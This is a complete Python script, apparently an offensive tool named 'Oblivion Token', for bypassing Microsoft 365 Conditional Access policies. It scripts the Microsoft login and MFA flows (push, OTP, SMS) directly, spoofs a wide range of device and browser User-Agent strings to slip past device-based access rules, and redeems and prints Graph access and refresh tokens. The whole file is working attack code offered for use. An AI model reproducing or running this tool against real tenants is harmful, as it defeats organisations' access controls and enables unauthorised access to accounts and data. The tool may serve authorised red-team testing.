#!/usr/bin/env python3
"""
Oblivion Token: M365 Conditional Access Policy Bypass OST (Offensive Tooling)
Authors: Vanitas & Mittcheng
"""

import argparse
import getpass
import json
import re
import sys
import time
from dataclasses import dataclass
from typing import Dict, Optional, Tuple

import requests


BANNER = r"""
  /$$$$$$  /$$       /$$ /$$            /$$                           /$$$$$$$$        /$$                          
 /$$__  $$| $$      | $$|__/           |__/                          |__  $$__/       | $$                          
| $$  \ $$| $$$$$$$ | $$ /$$ /$$    /$$ /$$  /$$$$$$  /$$$$$$$          | $$  /$$$$$$ | $$   /$$  /$$$$$$  /$$$$$$$ 
| $$  | $$| $$__  $$| $$| $$|  $$  /$$/| $$ /$$__  $$| $$__  $$         | $$ /$$__  $$| $$  /$$/ /$$__  $$| $$__  $$
| $$  | $$| $$  \ $$| $$| $$ \  $$/$$/ | $$| $$  \ $$| $$  \ $$         | $$| $$  \ $$| $$$$$$/ | $$$$$$$$| $$  \ $$
| $$  | $$| $$  | $$| $$| $$  \  $$$/  | $$| $$  | $$| $$  | $$         | $$| $$  | $$| $$_  $$ | $$_____/| $$  | $$
|  $$$$$$/| $$$$$$$/| $$| $$   \  $/   | $$|  $$$$$$/| $$  | $$         | $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$  | $$
 \______/ |_______/ |__/|__/    \_/    |__/ \______/ |__/  |__/         |__/ \______/ |__/  \__/ \_______/|__/  |__/
                                                                                                               
Oblivion Token: M365 Conditional Access Policy Bypass OST (Offensive Tooling)
Powered by : Vanitas & Mittcheng
"""

# Microsoft OAuth/Login endpoints
AUTH_BASE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
TOKEN_ENDPOINT = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
GET_CRED_TYPE_URL = "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US"
LOGIN_POST_URL = "https://login.microsoftonline.com/common/login"
SAS_BEGIN_AUTH_URL = "https://login.microsoftonline.com/common/SAS/BeginAuth"
SAS_END_AUTH_URL = "https://login.microsoftonline.com/common/SAS/EndAuth"
SAS_PROCESS_AUTH_URL = "https://login.microsoftonline.com/common/SAS/ProcessAuth"
APP_VERIFY_URL = "https://login.microsoftonline.com/appverify"
GRAPH_ME_URL = "https://graph.microsoft.com/v1.0/me"

DEFAULT_DEVICE = "Windows"
DEFAULT_BROWSER = "Edge"

# User-Agent profiles for device/browser spoofing
USER_AGENT_PROFILES: Dict[str, Dict[str, str]] = {
    "Mac": {
        "Chrome": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Firefox": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0",
        "Edge": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/604.1 Edg/91.0.100.0",
        "Safari": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15",
    },
    "Windows": {
        "IE": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Chrome": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Firefox": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0",
        "Edge": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042",
    },
    "AndroidMobile": {
        "Android": "Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
        "Chrome": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
        "Firefox": "Mozilla/5.0 (Android 4.4; Mobile; rv:70.0) Gecko/70.0 Firefox/70.0",
        "Edge": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 EdgA/103.0.1264.71",
    },
    "iPhone": {
        "Chrome": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.114 Mobile/15E148 Safari/604.1",
        "Firefox": "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4",
        "Edge": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 EdgiOS/44.5.0.10 Mobile/15E148 Safari/604.1",
        "Safari": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
    },
    "Linux": {
        "Chrome": "Mozilla/5.0 (M12; Linux X12-12) AppleWebKit/806.12 (KHTML, like Gecko) Ubuntu/23.04 Chrome/113.0.5672.63 Safari/16.4.1",
        "Firefox": "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.14) Gecko/2009090217 Ubuntu/9.04 (jaunty) Firefox/52.7.3",
        "Edge": "Mozilla/5.0 (Wayland; Linux x86_64; Surface) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Ubuntu/23.04 Edg/114.0.1823.43",
    },
    "OS/2": {
        "Firefox": "Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:80.7.12) Gecko/20050922 Firefox/80.0.7",
    },
    "PlayStation": {
        "Firefox": "Mozilla/5.0 (PlayStation 5 3.03/SmartTV) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    },
}

DEFAULT_BROWSER_PER_DEVICE: Dict[str, str] = {
    "Mac": "Safari",
    "Windows": "Edge",
    "AndroidMobile": "Android",
    "iPhone": "Safari",
    "Linux": "Firefox",
    "OS/2": "Firefox",
    "PlayStation": "Firefox",
}

DEVICE_CHOICES = tuple(USER_AGENT_PROFILES.keys())
BROWSER_CHOICES = ("Android", "IE", "Chrome", "Firefox", "Edge", "Safari")

# MFA authentication method identifiers
MFA_METHOD_PUSH = "PhoneAppNotification"
MFA_METHOD_OTP = "PhoneAppOTP"
MFA_METHOD_SMS = "OneWaySMS"


@dataclass
class Client:
    """Represents an OAuth client configuration."""
    name: str
    client_id: str
    redirect_uri: str
    scope: str


def create_choice_parser(name: str, options: Tuple[str, ...]):
    """Creates an argument parser for case-insensitive choice validation."""
    lookup = {opt.lower(): opt for opt in options}

    def parse_choice(value: str) -> str:
        if value is None:
            return value
        key = lookup.get(value.lower())
        if key is None:
            valid = ", ".join(options)
            raise argparse.ArgumentTypeError(f"Invalid {name} '{value}'. Valid options: {valid}.")
        return key

    return parse_choice


def resolve_user_agent(device: Optional[str], browser: Optional[str]) -> Tuple[str, Optional[str]]:
    """Resolves the User-Agent string based on device and browser selection."""
    dev = device or DEFAULT_DEVICE
    dev_profiles = USER_AGENT_PROFILES.get(dev)
    
    if not dev_profiles:
        warning = f"Unknown device '{dev}', defaulting to {DEFAULT_DEVICE}/{DEFAULT_BROWSER}."
        ua = USER_AGENT_PROFILES[DEFAULT_DEVICE][DEFAULT_BROWSER]
        return ua, warning

    if browser and browser in dev_profiles:
        return dev_profiles[browser], None

    if browser and browser not in dev_profiles:
        default_browser = DEFAULT_BROWSER_PER_DEVICE.get(dev, DEFAULT_BROWSER)
        fallback = dev_profiles.get(default_browser)
        if fallback:
            warning = (
                f"Browser '{browser}' not available for device '{dev}', "
                f"defaulting to {dev}/{default_browser}."
            )
            return fallback, warning

    default_browser = DEFAULT_BROWSER_PER_DEVICE.get(dev)
    if default_browser and default_browser in dev_profiles:
        return dev_profiles[default_browser], None

    ua = USER_AGENT_PROFILES[DEFAULT_DEVICE][DEFAULT_BROWSER]
    warning = f"Falling back to {DEFAULT_DEVICE}/{DEFAULT_BROWSER}."
    return ua, warning


def list_user_agent_profiles() -> None:
    """Displays all available User-Agent profiles."""
    print("Available User-Agent profiles:\n")
    for device, browsers in USER_AGENT_PROFILES.items():
        browser_list = ", ".join(sorted(browsers.keys()))
        print(f"{device} -> {browser_list}")
        for browser, ua in browsers.items():
            print(f"  {browser}: {ua}")
        print()


def load_clients(path: str) -> Dict[int, Client]:
    """Loads OAuth client configurations from a JSON file."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
    except FileNotFoundError:
        raise FileNotFoundError(f"Client configuration file not found: {path}")
    except json.JSONDecodeError as e:
        raise ValueError(f"Invalid JSON in client configuration file: {e}")

    clients: Dict[int, Client] = {}
    for i, c in enumerate(data, start=1):
        clients[i] = Client(
            name=c["name"],
            client_id=c["client_id"],
            redirect_uri=c["redirect_uri"],
            scope=c.get("scope", "openid offline_access")
        )
    return clients


def load_credentials(path: str) -> Tuple[Optional[str], Optional[str]]:
    """Loads credentials from a JSON file."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            cfg = json.load(f)
            return cfg.get("username"), cfg.get("password")
    except (FileNotFoundError, json.JSONDecodeError):
        return None, None


def get_authorize(session: requests.Session, client: Client) -> Tuple[requests.Response, str]:
    """Initiates OAuth authorization flow."""
    params = {
        "client_id": client.client_id,
        "redirect_uri": client.redirect_uri,
        "response_type": "code",
        "scope": client.scope,
        "sso_reload": "true",
    }
    r = session.get(AUTH_BASE_URL, params=params, allow_redirects=True)
    r.raise_for_status()
    return r, r.url


def post_get_credential_type(session: requests.Session, username: str, original_request: str, flow_token: str) -> Dict:
    """Validates username and retrieves credential type from Microsoft."""
    body = {
        "username": username,
        "isOtherIdpSupported": False,
        "checkPhones": False,
        "isRemoteNGCSupported": True,
        "isCookieBannerShown": False,
        "isFidoSupported": True,
        "originalRequest": original_request,
        "country": "US",
        "forceotclogin": False,
        "isExternalFederationDisallowed": False,
        "isRemoteConnectSupported": False,
        "federationFlags": 0,
        "isSignup": False,
        "flowToken": flow_token,
        "isAccessPassSupported": True,
        "isQrCodePinSupported": True,
    }
    r = session.post(GET_CRED_TYPE_URL, json=body)
    r.raise_for_status()
    return r.json()


def extract_hidden_fields(html: str) -> Dict[str, str]:
    """Extracts hidden form fields and tokens from HTML response."""
    fields = {}
    
    # Extract common hidden input fields
    for name in ("canary", "ctx", "flowToken", "hpgrequestid"):
        match = re.search(fr'name="{name}" value="([^"]+)"', html)
        if match:
            fields[name] = match.group(1)
    
    # Extract from JavaScript config objects
    if "flowToken" not in fields:
        for pattern in (r'\"flowToken\"\s*:\s*\"([^\"]+)\"', r'\"sFT\"\s*:\s*\"([^\"]+)\"'):
            match = re.search(pattern, html)
            if match:
                fields["flowToken"] = match.group(1)
                break
    
    if "ctx" not in fields:
        match = re.search(r'\"sCtx\"\s*:\s*\"([^\"]+)\"', html)
        if match:
            fields["ctx"] = match.group(1)
    
    return fields


def parse_interstitial(html: str) -> Dict[str, str]:
    """Parses interstitial redirect pages for updated tokens and URLs."""
    info: Dict[str, str] = {}
    
    # Extract urlPost
    match = re.search(r'\"urlPost\"\s*:\s*\"([^\"]+)\"', html)
    if match:
        info["urlPost"] = match.group(1).encode('utf-8').decode('unicode_escape')
    
    # Extract canary
    match = re.search(r'\"canary\"\s*:\s*\"([^\"]+)\"', html)
    if match:
        info["canary"] = match.group(1)
    
    # Extract flowToken
    for pattern in (r'\"sFT\"\s*:\s*\"([^\"]+)\"', r'\"flowToken\"\s*:\s*\"([^\"]+)\"'):
        match = re.search(pattern, html)
        if match:
            info["flowToken"] = match.group(1)
            break
    
    # Extract ctx
    for pattern in (r'\"sCtx\"\s*:\s*\"([^\"]+)\"', r'\"ctx\"\s*:\s*\"([^\"]+)\"'):
        match = re.search(pattern, html)
        if match:
            info["ctx"] = match.group(1)
            break
    
    return info


def post_login(session: requests.Session, username: str, password: str, fields: Dict[str, str], referer: str) -> requests.Response:
    """Posts login credentials to Microsoft authentication endpoint."""
    data = {
        "i13": "0",
        "login": username,
        "loginfmt": username,
        "type": "11",
        "LoginOptions": "3",
        "passwd": password,
        "ps": "2",
        "canary": fields.get("canary", ""),
        "ctx": fields.get("ctx", ""),
        "hpgrequestid": fields.get("hpgrequestid", ""),
        "flowToken": fields.get("flowToken", ""),
        "NewUser": "1",
        "FoundMSAs": "",
        "fspost": "0",
        "i21": "0",
        "CookieDisclosure": "0",
        "IsFidoSupported": "1",
        "isSignupPost": "0",
        "i19": "0",
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": referer
    }
    r = session.post(LOGIN_POST_URL, data=data, headers=headers, allow_redirects=False)
    return r


def extract_code_from_location(location: str) -> Optional[str]:
    """Extracts authorization code from redirect URL."""
    match = re.search(r'[?&]code=([^&]+)', location)
    return match.group(1) if match else None


def exchange_code_for_tokens(session: requests.Session, client: Client, code: str) -> Dict:
    """Exchanges authorization code for access and refresh tokens."""
    data = {
        "client_id": client.client_id,
        "redirect_uri": client.redirect_uri,
        "grant_type": "authorization_code",
        "scope": client.scope,
        "code": code,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = session.post(TOKEN_ENDPOINT, data=data, headers=headers)
    r.raise_for_status()
    return r.json()


def call_graph_me(access_token: str, session: Optional[requests.Session] = None) -> Optional[Dict]:
    """Calls Microsoft Graph API /me endpoint to verify token and retrieve user info."""
    headers = {"Authorization": f"Bearer {access_token}"}
    try:
        if session is not None:
            r = session.get(GRAPH_ME_URL, headers=headers, timeout=20)
        else:
            r = requests.get(GRAPH_ME_URL, headers=headers, timeout=20)
        
        if r.status_code == 200:
            return r.json()
        return None
    except requests.RequestException:
        return None


def select_client_interactive(clients: Dict[int, Client]) -> Tuple[int, Client]:
    """Prompts user to select an OAuth client configuration."""
    print("Select Target Clients:")
    for idx, c in clients.items():
        print(f"  {idx}) {c.name}")
    
    while True:
        choice = input("\nEnter number: ").strip()
        if not choice.isdigit():
            print("Please enter a valid number.")
            continue
        idx = int(choice)
        if idx in clients:
            return idx, clients[idx]
        print("Invalid choice. Try again.")


def print_failure_result(client: Client, idx: int):
    """Prints failure result message."""
    print("\n=========== Oblivion Token Result ===========\n")
    print("Status: FAILED - Unable to bypass Conditional Access Policy")
    print(f"Client: {client.name}")
    print(f"AppId: {client.client_id}")
    print("Scope: -")
    print("\n=============================================")


def handle_mfa_authentication(
    session: requests.Session,
    username: str,
    ctx_val: str,
    ft_val: str,
    canary_val: Optional[str],
    client: Client,
    selected_idx: int
) -> Optional[str]:
    """Handles MFA authentication flow (Push, OTP, SMS)."""
    print("\n[-] MFA Required.")
    print("\nChoose Authentication Method:")
    print("  1) Push notification")
    print("  2) Authenticator OTP")
    print("  3) SMS")
    
    choice = input("\nEnter number: ").strip()
    location = None
    
    def sas_begin_auth(auth_method: str) -> Dict:
        """Initiates SAS authentication."""
        body = {
            "AuthMethodId": auth_method,
            "Method": "BeginAuth",
            "ctx": ctx_val,
            "flowToken": ft_val,
        }
        r = session.post(SAS_BEGIN_AUTH_URL, json=body)
        r.raise_for_status()
        return r.json()
    
    def sas_end_auth(session_id: str, flow_token: str, ctx: str, auth_method: str, otc: Optional[str] = None) -> Dict:
        """Completes SAS authentication."""
        payload = {
            "Method": "EndAuth",
            "SessionId": session_id,
            "FlowToken": flow_token,
            "Ctx": ctx,
            "AuthMethodId": auth_method,
        }
        if otc:
            payload["AdditionalAuthData"] = otc
            payload["PollCount"] = 1
        r = session.post(SAS_END_AUTH_URL, json=payload)
        r.raise_for_status()
        return r.json()
    
    def finalize_mfa(form_type: str, otp_code: Optional[str] = None) -> Optional[str]:
        """Finalizes MFA by calling ProcessAuth and optionally appverify."""
        data_pa = {
            "type": form_type,
            "GeneralVerify": "false",
            "request": ctx_val,
            "login": username,
            "flowToken": ft_val,
            "hpgrequestid": "",
            "sacxt": "",
            "hideSmsInMfaProofs": "false",
            "i19": "0",
        }
        if otp_code:
            data_pa["otc"] = otp_code
        if canary_val:
            data_pa["canary"] = canary_val
        
        headers_pa = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": f"{SAS_PROCESS_AUTH_URL}",
        }
        proc = session.post(
            f"{SAS_PROCESS_AUTH_URL}?sso_reload=true",
            data=data_pa,
            headers=headers_pa,
            allow_redirects=False,
        )
        
        loc = proc.headers.get("Location")
        if not loc:
            # Try appverify endpoint
            hpgreqid = proc.headers.get("X-Ms-Request-Id", "")
            appverify_form = {
                "ContinueAuth": "true",
                "ctx": ctx_val,
                "hpgrequestid": hpgreqid,
                "flowToken": ft_val,
                "iscsrfspeedbump": "true",
            }
            if canary_val:
                appverify_form["canary"] = canary_val
            
            appverify_headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": f"{SAS_PROCESS_AUTH_URL}?sso_reload=true",
            }
            av = session.post(
                APP_VERIFY_URL,
                data=appverify_form,
                headers=appverify_headers,
                allow_redirects=False,
            )
            loc = av.headers.get("Location")
        
        return loc
    
    # Handle Authenticator OTP
    if choice == '2':
        try:
            begin = sas_begin_auth(MFA_METHOD_OTP)
            ft_val = begin.get("FlowToken", ft_val)
            ctx_val = begin.get("Ctx", ctx_val)
            session_id = begin.get("SessionId")
            
            otp = input("Enter 6-digit Authenticator One-Time Password Code: ").strip()
            if not otp.isdigit() or len(otp) != 6:
                print("[!] Invalid OTP format.")
                print_failure_result(client, selected_idx)
                sys.exit(2)
            
            endj = sas_end_auth(session_id, ft_val, ctx_val, MFA_METHOD_OTP, otp)
            ft_val = endj.get("FlowToken", ft_val)
            
            location = finalize_mfa("19", otp)
        except Exception as e:
            print(f"[!] OTP authentication failed: {e}")
            return None
    
    # Handle SMS
    elif choice == '3':
        try:
            begin_sms = sas_begin_auth(MFA_METHOD_SMS)
            ft_val = begin_sms.get("FlowToken", ft_val)
            ctx_val = begin_sms.get("Ctx", ctx_val)
            session_id = begin_sms.get("SessionId")
            
            sms_code = input("Enter 6-digit SMS Verification Code: ").strip()
            if not sms_code.isdigit() or len(sms_code) != 6:
                print("[!] Invalid SMS code format.")
                print_failure_result(client, selected_idx)
                sys.exit(2)
            
            end_sms = sas_end_auth(session_id, ft_val, ctx_val, MFA_METHOD_SMS, sms_code)
            ft_val = end_sms.get("FlowToken", ft_val)
            
            location = finalize_mfa("18", sms_code)
        except Exception as e:
            print(f"[!] SMS authentication failed: {e}")
            return None
    
    # Handle Push notification
    elif choice == '1':
        try:
            begin_push = sas_begin_auth(MFA_METHOD_PUSH)
            ft_val = begin_push.get("FlowToken", ft_val)
            ctx_val = begin_push.get("Ctx", ctx_val)
            session_id = begin_push.get("SessionId")
            
            # Extract approval number if available
            approval_num = None
            try:
                madd = begin_push.get("MobileAppAuthDetails") or {}
                approval_num = madd.get("Number") or madd.get("ApprovalNumber")
                
                if not approval_num and isinstance(begin_push.get("Message"), str):
                    match = re.search(r"(\d{2,})", begin_push["Message"])
                    if match:
                        approval_num = match.group(1)
                
                if not approval_num and isinstance(begin_push.get("Entropy"), int):
                    approval_num = str(begin_push["Entropy"])
            except Exception:
                pass
            
            if approval_num:
                print(f"Approve sign-in with number (You have 40s to proceed): {approval_num}")
            else:
                print("Approve the push notification on your device (You have 40s to proceed)")
            
            # Poll for approval
            for _ in range(40):
                poll = sas_end_auth(session_id, ft_val, ctx_val, MFA_METHOD_PUSH)
                ft_val = poll.get("FlowToken", ft_val)
                
                if not poll.get("Retry", True) and not poll.get("Success", False):
                    print("[!] Push notification rejected or timed out.")
                    print_failure_result(client, selected_idx)
                    sys.exit(2)
                
                if poll.get("Success", False):
                    location = finalize_mfa("22")
                    break
                
                time.sleep(1)
            
            if not location:
                print("[!] Push notification timeout.")
                print_failure_result(client, selected_idx)
                sys.exit(2)
        except Exception as e:
            print(f"[!] Push authentication failed: {e}")
            return None
    else:
        print("[!] Invalid choice.")
        print_failure_result(client, selected_idx)
        sys.exit(2)
    
    return location


def main():
    """Main execution flow."""
    parser = argparse.ArgumentParser(
        description="Oblivion Token: M365 Conditional Access Policy Bypass Research Tool"
    )
    parser.add_argument(
        "--user-agent",
        dest="user_agent_override",
        help="Override the User-Agent string explicitly.",
    )
    parser.add_argument(
        "--device",
        type=create_choice_parser("device", DEVICE_CHOICES),
        default=DEFAULT_DEVICE,
        help=(
            f"User-Agent device profile (default: {DEFAULT_DEVICE}). "
            f"Options: {', '.join(DEVICE_CHOICES)}. Use --list-user-agents for mappings."
        ),
    )
    parser.add_argument(
        "--browser",
        type=create_choice_parser("browser", BROWSER_CHOICES),
        default=None,
        help=(
            "User-Agent browser signature. Defaults to the common browser for the selected device. "
            f"Options: {', '.join(BROWSER_CHOICES)}."
        ),
    )
    parser.add_argument(
        "--list-user-agents",
        action="store_true",
        help="Print available device/browser combinations and exit.",
    )
    
    args = parser.parse_args()
    
    if args.list_user_agents:
        list_user_agent_profiles()
        return
    
    print(BANNER)
    
    # Load client configurations
    try:
        clients = load_clients("clients.json")
    except Exception as e:
        print(f"[!] Failed to load clients: {e}")
        sys.exit(1)
    
    # Load credentials
    cfg_user, cfg_pass = load_credentials("creds.json")
    
    # Prompt for credentials if not in config
    username = cfg_user or input("Enter username (UPN/email): ").strip()
    if not username:
        print("[!] Username is required.")
        sys.exit(1)
    
    password = cfg_pass or getpass.getpass("Enter password: ")
    if not password:
        print("[!] Password is required.")
        sys.exit(1)
    
    # Select target client
    selected_idx, client = select_client_interactive(clients)
    
    # Configure User-Agent
    if args.user_agent_override:
        user_agent = args.user_agent_override
        ua_warning = None
    else:
        user_agent, ua_warning = resolve_user_agent(args.device, args.browser)
    
    if ua_warning:
        print(f"[!] {ua_warning}")
    
    # Initialize session
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })
    
    # Step 1: Initiate authorization
    try:
        auth_resp, auth_url = get_authorize(sess, client)
    except requests.RequestException as e:
        print(f"[!] Authorization request failed: {e}")
        sys.exit(1)
    
    # Extract dynamic tokens
    fields = extract_hidden_fields(auth_resp.text)
    
    # Step 2: Validate username with GetCredentialType
    original_request = fields.get("ctx", "")
    flow_token = fields.get("flowToken", "")
    
    try:
        gct = post_get_credential_type(sess, username, original_request, flow_token)
        if "FlowToken" in gct:
            fields["flowToken"] = gct["FlowToken"]
    except requests.HTTPError:
        pass  # Continue with existing token
    
    # Step 3: Submit login credentials
    login_resp = post_login(sess, username, password, fields, referer=auth_url)
    
    code = None
    
    # Handle immediate redirect with authorization code
    if login_resp.status_code in (302, 303) and "Location" in login_resp.headers:
        location = login_resp.headers["Location"]
        code = extract_code_from_location(location)
        
        if not code:
            print_failure_result(client, selected_idx)
            sys.exit(2)
    else:
        # Handle interstitial pages
        html = login_resp.text or ""
        
        if "<title>Redirecting</title>" in html or "$Config" in html:
            inter = parse_interstitial(html)
            fields.update({k: v for k, v in inter.items() if k in ("canary", "flowToken", "ctx")})
            
            canary_val = inter.get("canary")
            url_post = inter.get("urlPost") or LOGIN_POST_URL
            
            # Ensure absolute URL
            if url_post.startswith("/"):
                url_post = "https://login.microsoftonline.com" + url_post
            
            # Re-submit login
            data = {
                "i13": "0",
                "login": username,
                "loginfmt": username,
                "type": "11",
                "LoginOptions": "3",
                "passwd": password,
                "ps": "2",
                "canary": fields.get("canary", ""),
                "ctx": fields.get("ctx", ""),
                "hpgrequestid": fields.get("hpgrequestid", ""),
                "flowToken": fields.get("flowToken", ""),
                "NewUser": "1",
                "FoundMSAs": "",
                "fspost": "0",
                "i21": "0",
                "CookieDisclosure": "0",
                "IsFidoSupported": "1",
                "isSignupPost": "0",
                "i19": "0",
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://login.microsoftonline.com/common/login",
            }
            
            again = sess.post(url_post, data=data, headers=headers, allow_redirects=False)
            
            if again.status_code in (302, 303) and "Location" in again.headers:
                location = again.headers["Location"]
                code = extract_code_from_location(location)
            else:
                # Follow redirect
                follow = sess.get(again.headers.get("Location", auth_url), allow_redirects=True)
                final_url = follow.url
                code = extract_code_from_location(final_url)
                
                # Check for MFA requirement
                if not code and ('$Config' in (again.text or '') or 'ConvergedTFA' in html):
                    cfg = (again.text or html)
                    inter2 = parse_interstitial(cfg)
                    ctx_val = inter2.get('ctx') or fields.get('ctx', '')
                    ft_val = inter2.get('flowToken') or fields.get('flowToken', '')
                    canary_val = inter2.get('canary') or locals().get('canary_val')
                    
                    location = handle_mfa_authentication(
                        sess, username, ctx_val, ft_val, canary_val, client, selected_idx
                    )
                    
                    if location:
                        code = extract_code_from_location(location)
                        if not code:
                            follow2 = sess.get(location, allow_redirects=True)
                            code = extract_code_from_location(follow2.url)
        else:
            # Attempt to follow redirect
            follow = sess.get(login_resp.headers.get("Location", auth_url), allow_redirects=True)
            final_url = follow.url
            code = extract_code_from_location(final_url)
    
    if not code:
        print_failure_result(client, selected_idx)
        sys.exit(2)
    
    # Step 4: Exchange authorization code for tokens
    try:
        tokens = exchange_code_for_tokens(sess, client, code)
    except requests.HTTPError as e:
        print(f"[!] Token exchange failed: {e}")
        sys.exit(3)
    
    access_token = tokens.get("access_token")
    refresh_token = tokens.get("refresh_token")
    
    if not access_token:
        print("[!] No access_token in response.")
        sys.exit(4)
    
    # Display results
    print("\n======= Successfully Redeemed Tokens =======")
    print("\n[*] MS Graph API Access Token:\n")
    print(access_token)
    
    if refresh_token:
        print("\n[*] Refresh Token:\n")
        print(refresh_token)
    
    # Verify token by calling Graph API
    me = call_graph_me(access_token, session=sess)
    
    print("\n=========== Oblivion Token Result ===========\n")
    print("Status: SUCCESS")
    print(f"Client: {client.name}")
    print(f"AppId: {client.client_id}")
    
    token_scope = tokens.get("scope") or client.scope
    print(f"Scope: {token_scope}")
    
    if me is not None:
        print("\n[*] Current User Information:\n")
        try:
            print(json.dumps(me, indent=2))
        except Exception:
            print(me)
    
    print("\n=============================================")


if __name__ == "__main__":
    main()